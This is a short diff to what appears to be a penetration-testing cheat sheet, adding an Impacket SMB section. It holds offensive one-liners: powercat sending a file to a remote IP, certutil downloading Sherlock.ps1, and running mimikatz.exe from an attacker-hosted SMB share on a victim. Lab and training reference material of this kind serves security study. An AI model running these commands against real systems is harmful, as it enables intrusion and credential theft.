@@ -67,3 +67,13 @@ powercat -c 10.11.0.4 -p 443 -i C:\Users\Offsec\powercat.ps1
 ```
 certutil.exe -urlcache -f http://<IP>/Sherlock.ps1 Sherlock,ps1
 ```
+
+## Impacket SMB
+
+```bash
+# In directory with file
+impacket-smbserver share .
+
+# From victim
+\\10.10.10.10\share\mimikatz.exe 
+```
